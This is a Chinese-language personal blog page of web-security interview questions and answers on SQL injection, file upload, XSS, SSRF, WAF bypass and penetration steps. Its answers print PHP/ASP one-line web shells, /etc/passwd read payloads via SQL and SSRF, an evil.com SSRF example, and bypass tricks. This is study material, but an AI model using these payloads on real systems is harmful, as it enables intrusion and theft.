@@ -1,0 +1,1025 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="en">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
+
+<link rel="stylesheet" href="/css/main.css?v=7.1.1">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.1">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.1.1">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.1.1">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.1.1" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.1.1',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: true,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="总结一下面试碰到的问题。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="&#39;面试问题&#39;">
+<meta property="og:url" content="https://chirec.github.io/2019/07/06/Learn-From-Interview/index.html">
+<meta property="og:site_name" content="Emerald Dream">
+<meta property="og:description" content="总结一下面试碰到的问题。">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2019-07-12T01:03:26.624Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="&#39;面试问题&#39;">
+<meta name="twitter:description" content="总结一下面试碰到的问题。">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="https://chirec.github.io/2019/07/06/Learn-From-Interview/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>'面试问题' | Emerald Dream</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Emerald Dream</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+  
+  
+
+  
+
+  <a href="https://github.com/yourname" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>
+
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://chirec.github.io/2019/07/06/Learn-From-Interview/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="chessur">
+      <meta itemprop="description" content="Freedom as Autonomy">
+      <meta itemprop="image" content="/images/cat.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Emerald Dream">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">'面试问题'
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-07-06 20:46:50" itemprop="dateCreated datePublished" datetime="2019-07-06T20:46:50+08:00">2019-07-06</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2019-07-12 09:03:26" itemprop="dateModified" datetime="2019-07-12T09:03:26+08:00">2019-07-12</time>
+              
+            
+          </span>
+
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>总结一下面试碰到的问题。</p>
+<a id="more"></a>
+<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h4 id="SQL注入时，注入点是数值型注入，不触发WAF的payload"><a href="#SQL注入时，注入点是数值型注入，不触发WAF的payload" class="headerlink" title="SQL注入时，注入点是数值型注入，不触发WAF的payload"></a>SQL注入时，注入点是数值型注入，不触发WAF的payload</h4><p>1.0、1/1、1*1</p>
+<h4 id="SQL注入可以做什么，写出针对于www-baidu-com-id-1的测试流程？"><a href="#SQL注入可以做什么，写出针对于www-baidu-com-id-1的测试流程？" class="headerlink" title="SQL注入可以做什么，写出针对于www.baidu.com?id=1的测试流程？"></a>SQL注入可以做什么，写出针对于<a href="www.baidu.com?id=1">www.baidu.com?id=1</a>的测试流程？</h4><p>SQL注入可以获取数据库信息，例如用户名、密码；<br>可以删除或修改数据；<br>向数据库添加数据，如添加管理员用户；<br>在权限控制不够严格，拥有写入权限，并知道网站绝对路径时，可以写入Webshell；拥有读权限时，可以读取敏感文件，如<code>select load_file(/etc/passwd) --</code></p>
+<h5 id="测试流程"><a href="#测试流程" class="headerlink" title="测试流程"></a>测试流程</h5><p>a.测试是否存在注入，使用<code>&#39;</code>、<code>&quot;</code>、<code>and 1=2</code>等，根据页面是否发生变化判断是否存在注入，或使用<code>sleep(5)</code>根据页面加载速度判断是否存在注入</p>
+<p>b.判断注入类型：Union、报错、布尔盲注、时间盲注、堆注入、内联注入</p>
+<p>c.判断数据库类型：MySQL、Oracle、SQL Server</p>
+<h4 id="了解过哪些数据库的注入？"><a href="#了解过哪些数据库的注入？" class="headerlink" title="了解过哪些数据库的注入？"></a>了解过哪些数据库的注入？</h4><p>Mysql、MSSQL、Oracle</p>
+<h4 id="SQL注入可以采取什么方法修复？描述每种方法的利弊。"><a href="#SQL注入可以采取什么方法修复？描述每种方法的利弊。" class="headerlink" title="SQL注入可以采取什么方法修复？描述每种方法的利弊。"></a>SQL注入可以采取什么方法修复？描述每种方法的利弊。</h4><p>使用参数化查询，增加额外的开发成本，程序不好维护</p>
+<p>转义字符，只能转移部分字符，存在绕过风险</p>
+<p>使用WAF，WAF规则库需要更新，存在绕过风险</p>
+<h4 id="宽字节注入的原理？"><a href="#宽字节注入的原理？" class="headerlink" title="宽字节注入的原理？"></a>宽字节注入的原理？</h4><p>前端编码和数据库编码不一致，数据库编码是GBK、GB2312这种两个字节表示一个字符的编码<br>有转义函数，将<code>&#39;</code>转义为<code>\&#39;</code></p>
+<h4 id="二次编码注入的原理？"><a href="#二次编码注入的原理？" class="headerlink" title="二次编码注入的原理？"></a>二次编码注入的原理？</h4><p>服务器收到数据后会进行解码，<code>mysql_real_escape_string()</code>等转义函数在urldecode()前，所以无法转义经过编码后的字符，然后再由<code>urldecode()</code>进行解码。</p>
+<h4 id="渗透时后端环境是apache-php-mysql的情况下，利用sql注入写webshell一般来说需要满足三个条件：1-mysql用户需要有（）权限；2-需要知道（）路径；3-（）（符号）不能被过滤。"><a href="#渗透时后端环境是apache-php-mysql的情况下，利用sql注入写webshell一般来说需要满足三个条件：1-mysql用户需要有（）权限；2-需要知道（）路径；3-（）（符号）不能被过滤。" class="headerlink" title="渗透时后端环境是apache+php+mysql的情况下，利用sql注入写webshell一般来说需要满足三个条件：1.mysql用户需要有（）权限；2.需要知道（）路径；3.（）（符号）不能被过滤。"></a>渗透时后端环境是apache+php+mysql的情况下，利用sql注入写webshell一般来说需要满足三个条件：1.mysql用户需要有（）权限；2.需要知道（）路径；3.（）（符号）不能被过滤。</h4><p>root权限、网站绝对路径、<code>&#39;</code>、<code>:</code>、<code>/</code>、<code>\</code></p>
+<h4 id="二次注入的原理？"><a href="#二次注入的原理？" class="headerlink" title="二次注入的原理？"></a>二次注入的原理？</h4><p>数据库保存数据时，保存的是未经过滤的数据，在其他地方调用数据执行SQL查询，也未经过过滤，导致注入产生。</p>
+<h4 id="如果存在SQL注入怎么判断不同类型的数据库？"><a href="#如果存在SQL注入怎么判断不同类型的数据库？" class="headerlink" title="如果存在SQL注入怎么判断不同类型的数据库？"></a>如果存在SQL注入怎么判断不同类型的数据库？</h4><p>不同数据库，存在独特的库，Mysql的information_schma，MSSQL的sysobjects，Oracle的dual，通过exists(select * from information_schma)来判断不同类型的数据库</p>
+<p>查看报错信息，不同数据库的报错信息不同</p>
+<h4 id="报错注入的函数有哪些？"><a href="#报错注入的函数有哪些？" class="headerlink" title="报错注入的函数有哪些？"></a>报错注入的函数有哪些？</h4><p>extractvalue()、updatexml()、floor()、polygon()、exp()</p>
+<h4 id="SQL注入的类型"><a href="#SQL注入的类型" class="headerlink" title="SQL注入的类型"></a>SQL注入的类型</h4><p>B(布尔盲注)、U(Union查询)、T(时间盲注)、S(堆注入)、E(报错注入)、Q(内联查询)</p>
+<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h4 id="常见的一句话有哪些？木马的变形有哪些方式？"><a href="#常见的一句话有哪些？木马的变形有哪些方式？" class="headerlink" title="常见的一句话有哪些？木马的变形有哪些方式？"></a>常见的一句话有哪些？木马的变形有哪些方式？</h4><p>PHP：<code>&lt;?php eval($_POST[Windy]) ?&gt;</code><br>ASP：<code>&lt;%eval request(&quot;Windy&quot;)%&gt;</code></p>
+<p>变形方式：将函数也作为参数从前端获取，将一句话的字符转为ascii码</p>
+<h4 id="文件上传漏洞的原理？"><a href="#文件上传漏洞的原理？" class="headerlink" title="文件上传漏洞的原理？"></a>文件上传漏洞的原理？</h4><p>没有对上传的文件进行严格验证和过滤</p>
+<h4 id="绕过文件上传的技巧有哪些"><a href="#绕过文件上传的技巧有哪些" class="headerlink" title="绕过文件上传的技巧有哪些?"></a>绕过文件上传的技巧有哪些?</h4><p>关闭JS<br>修改Content-type<br>修改拓展名<br>修改文件头<br>上传<code>.htaccess</code>文件</p>
+<h4 id="编辑器漏洞有了解码？"><a href="#编辑器漏洞有了解码？" class="headerlink" title="编辑器漏洞有了解码？"></a>编辑器漏洞有了解码？</h4><p>FCKeditor</p>
+<p>EWebeditor</p>
+<h4 id="说说解析漏洞？"><a href="#说说解析漏洞？" class="headerlink" title="说说解析漏洞？"></a>说说解析漏洞？</h4><p>Web中间件的漏洞，会造成解析不该解析的文件类型</p>
+<p>IIS6.0 包含<code>.asp</code>后缀的文件夹下，所有文件以<code>asp</code>文件解析；会解析<code>a.asa</code>、<code>a.cer</code><br>IIS7.0 在图片后加入<code>/.php</code>会以<code>php</code>文件解析；会解析<code>a.php;*.png</code>的文件<br>Apache 从右向左，依次尝试解析后缀，知道碰到认识的后缀</p>
+<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h4 id="文件包含漏洞的原理，分类，条件？"><a href="#文件包含漏洞的原理，分类，条件？" class="headerlink" title="文件包含漏洞的原理，分类，条件？"></a>文件包含漏洞的原理，分类，条件？</h4><p>include()、require()中的参数用户可控，并无严格过滤</p>
+<p>本地文件包含</p>
+<p>远程文件包含 开启<code>url_allow_fopen</code>和<code>url_allow_include</code></p>
+<h4 id="文件包含漏洞伪协议有哪些？"><a href="#文件包含漏洞伪协议有哪些？" class="headerlink" title="文件包含漏洞伪协议有哪些？"></a>文件包含漏洞伪协议有哪些？</h4><p><code>php://input</code><br><code>php://filter</code><br><code>file://</code><br><code>phar://</code><br><code>zip://</code><br><code>data://</code></p>
+<h4 id="命令执行、代码执行的原理？"><a href="#命令执行、代码执行的原理？" class="headerlink" title="命令执行、代码执行的原理？"></a>命令执行、代码执行的原理？</h4><p>参数用户可控，调用命令执行、代码执行函数，未对参数进行过滤或过滤不严谨</p>
+<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h4 id="XSS可以做什么？写出不同场景下的Payload思路？"><a href="#XSS可以做什么？写出不同场景下的Payload思路？" class="headerlink" title="XSS可以做什么？写出不同场景下的Payload思路？"></a>XSS可以做什么？写出不同场景下的Payload思路？</h4><p>1.网络钓鱼，包括盗取各类的用户账号<br>2.窃取用户cookie<br>3.窃取用户浏览会话<br>4.强制弹出广告页面、刷流量<br>5.网页挂马<br>6.提升用户权限，进一步渗透网站<br>7.传播跨站脚本蠕虫</p>
+<h4 id="XSS-payload的变形方式？"><a href="#XSS-payload的变形方式？" class="headerlink" title="XSS payload的变形方式？"></a>XSS payload的变形方式？</h4><h4 id="XSS分哪几种类型，描述每种XSS类型的发生流程。写出针对于-lt-www-baidu-com-id-1-gt-的测试流程？"><a href="#XSS分哪几种类型，描述每种XSS类型的发生流程。写出针对于-lt-www-baidu-com-id-1-gt-的测试流程？" class="headerlink" title="XSS分哪几种类型，描述每种XSS类型的发生流程。写出针对于&lt;www.baidu.com?id=1&gt;的测试流程？"></a>XSS分哪几种类型，描述每种XSS类型的发生流程。写出针对于&lt;<a href="http://www.baidu.com?id=1&gt;的测试流程？" target="_blank" rel="noopener">www.baidu.com?id=1&gt;的测试流程？</a></h4><p>反射型，非持久型，需要用户点击恶意链接才能触发</p>
+<p>存储型，持久型，用户访问存在XSS的页面即可触发</p>
+<p>DOM型，可以改变网页DOM节点，将XSS链接伪装成正常链接</p>
+<h4 id="XSS防御方案怎么做，不同场景下是否会使用不同的方案，比如：搜索业务、博客？"><a href="#XSS防御方案怎么做，不同场景下是否会使用不同的方案，比如：搜索业务、博客？" class="headerlink" title="XSS防御方案怎么做，不同场景下是否会使用不同的方案，比如：搜索业务、博客？"></a>XSS防御方案怎么做，不同场景下是否会使用不同的方案，比如：搜索业务、博客？</h4><p>前端过滤：移除用户上传的高危标签<br>输出编码：HTML编码</p>
+<p>搜索业务会显示搜索内容，</p>
+<p>博客会有留言、分享、私信</p>
+<h4 id="XSS获取屏幕截图，屏幕截图的范围"><a href="#XSS获取屏幕截图，屏幕截图的范围" class="headerlink" title="XSS获取屏幕截图，屏幕截图的范围"></a>XSS获取屏幕截图，屏幕截图的范围</h4><p>浏览器解析范围</p>
+<h4 id="简述下浏览器的自解码机制。"><a href="#简述下浏览器的自解码机制。" class="headerlink" title="简述下浏览器的自解码机制。"></a>简述下浏览器的自解码机制。</h4><p>URL编码、HTML编码、JavaScrip编码</p>
+<p><a href="https://security.yirendai.com/news/share/26" target="_blank" rel="noopener">浅谈XSS—字符编码和浏览器解析原理</a></p>
+<h4 id="网站存在phpinfo页面，设置HTTP-Only，如何使用XSS盗取Cookie"><a href="#网站存在phpinfo页面，设置HTTP-Only，如何使用XSS盗取Cookie" class="headerlink" title="网站存在phpinfo页面，设置HTTP-Only，如何使用XSS盗取Cookie"></a>网站存在phpinfo页面，设置HTTP-Only，如何使用XSS盗取Cookie</h4><p>HTTP-Only，设置之后，Cookie无法在JavaScript中获取到，只会通过HTTP协议传输过程中带到服务器。</p>
+<p>使用XSS获取phpinfo页面信息中的Header数据，Header数据中会存在HTTP-Only的Cookie</p>
+<p>支持TRACE方法的服务器、CVE-2012-0053(Apache  2.x)，CVE-3009-0357(FireFox)</p>
+<p>HTTP-Only绕过姿势<a href="https://www.zzsec.org/2013/03/something-about-httponly/" target="_blank" rel="noopener">HttpOnly的那些事</a></p>
+<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><h4 id="CSRF漏洞的原理是什么？怎么修复？"><a href="#CSRF漏洞的原理是什么？怎么修复？" class="headerlink" title="CSRF漏洞的原理是什么？怎么修复？"></a>CSRF漏洞的原理是什么？怎么修复？</h4><p>原理：攻击者构造链接，诱导受害者点击，受害者点击后使用自身的身份验证向服务器发送请求。<br>修复：验证rerfer、token、向用户发送验证码，其中向用户发送验证码这种二次验证最为有效，可以和前两种组合使用</p>
+<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><h4 id="XXE漏洞原理以及利用方式？"><a href="#XXE漏洞原理以及利用方式？" class="headerlink" title="XXE漏洞原理以及利用方式？"></a>XXE漏洞原理以及利用方式？</h4><p>中间件开启XML解析组件，并且没有关闭解析外部实体。</p>
+<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h4 id="SSRF可以用来做什么，哪些场景容易产生这个类型的漏洞？写出不同场景下的Payload思路。"><a href="#SSRF可以用来做什么，哪些场景容易产生这个类型的漏洞？写出不同场景下的Payload思路。" class="headerlink" title="SSRF可以用来做什么，哪些场景容易产生这个类型的漏洞？写出不同场景下的Payload思路。"></a>SSRF可以用来做什么，哪些场景容易产生这个类型的漏洞？写出不同场景下的Payload思路。</h4><p>扫描内部网络和端口：<code>url=http://10.0.0.0:80</code></p>
+<p>执行拒绝服务，请求大文件，保持连接Keep-Alive Always <code>url=http://evil.com/big_file</code></p>
+<p>攻击内网：向内部任意主机的任意端口发送Payload，攻击内网Web应用(使用GET方法可以实现的攻击，如Strust2，SQLi) <code>url=http://192.168.126.1/index.php?id=1 and sleep(5)</code></p>
+<p>利用file协议读取本地文件 <code>url=file:///etc/passwd</code></p>
+<p>利用gopher协议反弹shell 需要结合Redis未授权访问 使用Redis写入脚本，再捕获数据，使用脚本转换为gopher格式，再使用gopher协议反弹shell</p>
+<p>从其他服务器获取数据的功能的地方(图片、文档)</p>
+<p>在线翻译</p>
+<p>收藏</p>
+<h4 id="SSRF漏洞修复方案怎么做，难点在哪？"><a href="#SSRF漏洞修复方案怎么做，难点在哪？" class="headerlink" title="SSRF漏洞修复方案怎么做，难点在哪？"></a>SSRF漏洞修复方案怎么做，难点在哪？</h4><p>白名单-允许指定URL的HOST</p>
+<p>限制内网IP</p>
+<p>限制协议为HTTP、HTTPS，禁止file:///，gopher://，ftp://，dict://</p>
+<p>禁止30X跳转</p>
+<p>统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态</p>
+<h4 id="SSRF绕过方式"><a href="#SSRF绕过方式" class="headerlink" title="SSRF绕过方式"></a>SSRF绕过方式</h4><p>@IP</p>
+<h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><h4 id="反序列化漏洞有哪些？是否懂原理？"><a href="#反序列化漏洞有哪些？是否懂原理？" class="headerlink" title="反序列化漏洞有哪些？是否懂原理？"></a>反序列化漏洞有哪些？是否懂原理？</h4><p>PHP反序列漏洞、Java反序列化漏洞</p>
+<h2 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h2><h4 id="欺骗和嗅探的原理？工具？"><a href="#欺骗和嗅探的原理？工具？" class="headerlink" title="欺骗和嗅探的原理？工具？"></a>欺骗和嗅探的原理？工具？</h4><p>计算机之间通信通过MAC地址，但对获得的MAC地址不做验证，直接记录，所以可以发送ARP包达到欺骗的目的</p>
+<p>Ettercap</p>
+<h2 id="域"><a href="#域" class="headerlink" title="域"></a>域</h2><h2 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h2><h4 id="VMWare的网络模式"><a href="#VMWare的网络模式" class="headerlink" title="VMWare的网络模式"></a>VMWare的网络模式</h4><p>NAT</p>
+<p>HostOnly</p>
+<p>桥接</p>
+<h2 id="Web容器"><a href="#Web容器" class="headerlink" title="Web容器"></a>Web容器</h2><h4 id="Web容器有哪些？"><a href="#Web容器有哪些？" class="headerlink" title="Web容器有哪些？"></a>Web容器有哪些？</h4><p>Apache-HTTP Server<br>Apache Tomcat<br>Nginx<br>Weblogic<br>WebSphere<br>Lighttpd<br>JBoss</p>
+<h2 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h2><h4 id="HTTP请求方式有哪些？"><a href="#HTTP请求方式有哪些？" class="headerlink" title="HTTP请求方式有哪些？"></a>HTTP请求方式有哪些？</h4><p>GET、POST、TRACE、DELETE、PUT、HEAD、OPTION</p>
+<h4 id="状态码"><a href="#状态码" class="headerlink" title="状态码"></a>状态码</h4><p>1XX 需要用户进一步请求<br>2XX 请求成功<br>3XX 重定向<br>4XX 客户端请求错误<br>5XX 服务端错误<br>200<br>302<br>403 访问禁止<br>404 文件不存在<br>500 服务器内部错误</p>
+<h4 id="在HTTP请求头中user-agent、referer、cookie、x-forward-for、content-type分别表示什么？"><a href="#在HTTP请求头中user-agent、referer、cookie、x-forward-for、content-type分别表示什么？" class="headerlink" title="在HTTP请求头中user-agent、referer、cookie、x-forward-for、content-type分别表示什么？"></a>在HTTP请求头中user-agent、referer、cookie、x-forward-for、content-type分别表示什么？</h4><p>user-agent 客户端使用的浏览器、操作系统</p>
+<h2 id="安全设备"><a href="#安全设备" class="headerlink" title="安全设备"></a>安全设备</h2><h4 id="WAF绕过的方法有哪些？"><a href="#WAF绕过的方法有哪些？" class="headerlink" title="WAF绕过的方法有哪些？"></a>WAF绕过的方法有哪些？</h4><p>大小写，双写，内联注释，编码，等价函数替换，分块传输，</p>
+<h4 id="哪些漏洞WAF防御不了？"><a href="#哪些漏洞WAF防御不了？" class="headerlink" title="哪些漏洞WAF防御不了？"></a>哪些漏洞WAF防御不了？</h4><p>0day，因为WAF基于特征码来进行阻断，0day的特征码</p>
+<p>绕过WAF，进入内网执行的漏洞</p>
+<p>加密的流量</p>
+<p>绕过WAF规则</p>
+<p>逻辑漏洞</p>
+<p>信息泄露</p>
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h4 id="Session和Cookie有什么区别，Cookie伪造以及Session伪造漏洞的发生原因是什么？怎么修复？"><a href="#Session和Cookie有什么区别，Cookie伪造以及Session伪造漏洞的发生原因是什么？怎么修复？" class="headerlink" title="Session和Cookie有什么区别，Cookie伪造以及Session伪造漏洞的发生原因是什么？怎么修复？"></a>Session和Cookie有什么区别，Cookie伪造以及Session伪造漏洞的发生原因是什么？怎么修复？</h4><p>Session是存放在服务器的身份凭证，Session没有限量</p>
+<p>Cookie是存放在本地浏览器上的身份凭证，Cookie限制了数据量，只允许4KB</p>
+<p>Cookie伪造原理，获取用户的Cookie后，服务器对发送的Cookie进行验证，验证通过即登录账户，使用HTTP-Only</p>
+<p>Session伪造，给被攻击者发送一个伪造的Session，使其登录，可以使用这个Session登录，修复，在登录后重置SessionID</p>
+<h4 id="什么是指纹识别？"><a href="#什么是指纹识别？" class="headerlink" title="什么是指纹识别？"></a>什么是指纹识别？</h4><p>可以用来识别Web服务类型的独特特征，会在响应包中返回<br>网页中关键字、特定文件的Hash值(主要是静态文件)<br>指定URL的关键字<br>指定URL的Tag模式</p>
+<p>浅谈web指纹识别技术</p>
+<h4 id="写过博客吗？日常的学习过程关注哪些安全平台？"><a href="#写过博客吗？日常的学习过程关注哪些安全平台？" class="headerlink" title="写过博客吗？日常的学习过程关注哪些安全平台？"></a>写过博客吗？日常的学习过程关注哪些安全平台？</h4><h4 id="后期工作规划？"><a href="#后期工作规划？" class="headerlink" title="后期工作规划？"></a>后期工作规划？</h4><h4 id="薪资待遇有什么想法？"><a href="#薪资待遇有什么想法？" class="headerlink" title="薪资待遇有什么想法？"></a>薪资待遇有什么想法？</h4><h4 id="之前没从事过安全方面的工作，为什么要现在要从事这方面的工作？"><a href="#之前没从事过安全方面的工作，为什么要现在要从事这方面的工作？" class="headerlink" title="之前没从事过安全方面的工作，为什么要现在要从事这方面的工作？"></a>之前没从事过安全方面的工作，为什么要现在要从事这方面的工作？</h4><h2 id="渗透流程"><a href="#渗透流程" class="headerlink" title="渗透流程"></a>渗透流程</h2><h4 id="拿到目标站怎么进行渗透，需要注意什么。"><a href="#拿到目标站怎么进行渗透，需要注意什么。" class="headerlink" title="拿到目标站怎么进行渗透，需要注意什么。"></a>拿到目标站怎么进行渗透，需要注意什么。</h4><p>查询目标站的IP地址，如果存在CDN，可以通过查询SSL证书，查询域名解析历史记录，从国外访问查询IP等方法查询真实IP；<br>知道目标站真实IP后，进行IP反查，查询是否存在旁站，查询C段网站，若目标站不好渗透，可以从旁站下手；<br>对目标网站的IP扫描开放端口，查看各个服务版本，以及各服务的第三方组件信息；<br>对目标网站进行漏洞分析，查找目标网站的Web漏洞；<br>对找到的漏洞，进行漏洞利用；若目标网站未找到可利用漏洞，可以继续寻找旁站和C段的漏洞；<br>使用漏洞获得Webshell后，对目标服务器的系统信息进行收集，收集系统补丁信息，系统版本信息，第三方软件版本信息，安全配置信息等系统信息；<br>同时收集内网信息，使用代理或端口转发对内网进行扫描，为内网渗透做准备；<br>对上一步收集到的信息进行分析，进行提权；若无法提权，寻找内网中另一台机器，继续进行渗透；<br>在获取权限后，做后渗透攻击；<br>撰写渗透测试报告，报告加密发送。</p>
+<h4 id="CDN技术有了解码？如何绕过CDN寻找站点真实IP？"><a href="#CDN技术有了解码？如何绕过CDN寻找站点真实IP？" class="headerlink" title="CDN技术有了解码？如何绕过CDN寻找站点真实IP？"></a>CDN技术有了解码？如何绕过CDN寻找站点真实IP？</h4><p>CDN(内容分发网络，Content Delivery Network)</p>
+<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><h4 id="代码审计怎么做？"><a href="#代码审计怎么做？" class="headerlink" title="代码审计怎么做？"></a>代码审计怎么做？</h4><p>查看敏感函数、高危函数、敏感功能点、可控变量</p>
